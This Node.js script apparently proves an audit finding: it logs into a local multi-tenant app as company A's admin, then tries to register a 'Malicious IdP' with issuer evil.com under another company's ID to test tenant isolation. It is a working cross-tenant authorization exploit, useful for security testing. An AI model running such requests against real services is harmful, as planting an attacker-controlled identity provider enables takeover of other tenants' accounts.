// F5c - Cross-tenant IdP creation proof
const http = require('http');

async function main() {
  console.log('--- Step 1: Login to get token for company A ---');
  const loginData = JSON.stringify({ email: 'admin@parilink.com', password: 'password123' });
  
  const loginOptions = {
    hostname: 'localhost',
    port: 8080,
    path: '/api/v1/auth/login',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(loginData)
    }
  };

  const token = await new Promise((resolve, reject) => {
    const req = http.request(loginOptions, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const parsed = JSON.parse(data);
          let tokenStr = parsed.accessToken;
          if (!tokenStr) {
            const cookie = (res.headers['set-cookie'] || []).find(c => c.startsWith('access_token='));
            if (cookie) tokenStr = cookie.split(';')[0].split('=')[1];
          }
          resolve(tokenStr);
        } catch (e) {
          resolve(null);
        }
      });
    });
    req.on('error', reject);
    req.write(loginData);
    req.end();
  });

  if (!token) {
    console.error('Failed to get token (API might not be seeded or ready yet)');
    return;
  }
  console.log('Successfully got token.');

  console.log('\n--- Step 2: Attempt to create IdP for a DIFFERENT company (Cross-tenant) ---');
  const fakeCompanyId = '00000000-0000-0000-0000-000000000000';
  
  const payload = JSON.stringify({
    name: 'Malicious IdP',
    type: 'OIDC',
    clientId: 'foo',
    clientSecret: 'bar',
    issuerUrl: 'https://evil.com'
  });

  const createOptions = {
    hostname: 'localhost',
    port: 8080,
    path: `/api/v1/companies/${fakeCompanyId}/idps`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload),
      'Authorization': `Bearer ${token}` // Passing the JWT from company A
    }
  };

  await new Promise((resolve, reject) => {
    const req = http.request(createOptions, (res) => {
      console.log(`STATUS: ${res.statusCode}`);
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        console.log(`RESPONSE BODY: ${data}`);
        resolve();
      });
    });
    req.on('error', reject);
    req.write(payload);
    req.end();
  });
}

main().catch(console.error);
